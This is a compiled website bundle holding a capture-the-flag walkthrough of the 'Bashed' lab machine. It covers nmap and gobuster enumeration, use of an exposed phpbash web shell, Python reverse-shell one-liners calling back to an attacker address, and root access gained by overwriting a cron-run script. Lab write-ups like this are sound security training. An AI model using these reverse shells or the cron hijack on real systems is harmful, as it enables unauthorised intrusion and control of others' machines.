(window.webpackJsonp=window.webpackJsonp||[]).push([[67],{407:function(t,s,a){"use strict";a.r(s);var e=a(13),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"bashed"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bashed"}},[t._v("#")]),t._v(" Bashed")]),t._v(" "),s("h2",{attrs:{id:"initial-scan"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#initial-scan"}},[t._v("#")]),t._v(" Initial scan")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("nmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-A")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-T5")]),t._v(" -p- "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.68\n")])])]),s("h3",{attrs:{id:"result"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#result"}},[t._v("#")]),t._v(" Result")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("tarting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 02:15 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.22s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nAggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   203.62 ms 10.10.14.1\n2   204.09 ms 10.10.10.68\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.12 seconds\n")])])]),s("h2",{attrs:{id:"gobuster"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#gobuster"}},[t._v("#")]),t._v(" Gobuster")]),t._v(" "),s("p",[t._v("Seeing that there's a web server hosted on port 80, let's try using gobuster to look for any subdirectories.")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("gobuster "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("dir")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" http://10.10.10.68 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-w")]),t._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n")])])]),s("p",[t._v("result:")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.10.68\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/04/11 20:41:05 Starting gobuster\n===============================================================\n/images (Status: 301)\n/uploads (Status: 301)\n/php (Status: 301)\n/css (Status: 301)\n/dev (Status: 301)\n/js (Status: 301)\n/fonts (Status: 301)\n/server-status (Status: 403)\nProgress: 161818 / 220561 (73.37%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/04/11 21:41:57 Finished\n===============================================================\n")])])]),s("p",[t._v("navigating through the dev folder, we find that there's a phpbash script available")]),t._v(" "),s("h2",{attrs:{id:"php-bash"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#php-bash"}},[t._v("#")]),t._v(" PHP bash")]),t._v(" "),s("p",[t._v("A quick look at the documentation of phpbash tells us which commands are available:\n"),s("a",{attrs:{href:"https://github.com/Arrexel/phpbash",target:"_blank",rel:"noopener noreferrer"}},[t._v("php-bash github"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("On our local machine:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-nlvp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4444")]),t._v("\n")])])]),s("p",[t._v("On the phpbash:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" /home/arrexel\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" user.txt\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# Getting a reverse shell")]),t._v("\npython "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')]),t._v("\n")])])]),s("h2",{attrs:{id:"priv-esc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[t._v("#")]),t._v(" Priv esc")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-l")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# shows we can run things as scriptmanager group")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" scriptmanager "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-Al")]),t._v(" /scripts "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# here we notice that there's a script that's getting run by a CRON job")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" scriptmanager "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("vi")]),t._v(" /scripts/test.py\n")])])]),s("p",[t._v("Now insert the python code into the machine")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" socket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("subprocess"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("os\ns"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("socket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("socket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("socket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("AF_INET"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("socket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SOCK_STREAM"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ns"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("connect"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"10.10.14.14"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nos"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dup2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fileno"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nos"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dup2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fileno"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nos"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dup2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fileno"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("p"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("subprocess"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("call"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"-i"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),s("p",[t._v("And check if it was inserted correctly")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" scriptmanager "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /scripts/test.py\n")])])]),s("p",[t._v("Now just open another netcat session")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-nvlp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v("\n")])])]),s("p",[t._v("and once the CRON job runs the python file, we are able to get a reverse shell.")]),t._v(" "),s("h2",{attrs:{id:"extra-notes"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#extra-notes"}},[t._v("#")]),t._v(" Extra notes")]),t._v(" "),s("p",[t._v("You can spawn a TTY shell with a few commands. Listed here: "),s("a",{attrs:{href:"https://netsec.ws/?p=337",target:"_blank",rel:"noopener noreferrer"}},[t._v("TTY spawn"),s("OutboundLink")],1)])])}),[],!1,null,null,null);s.default=n.exports}}]);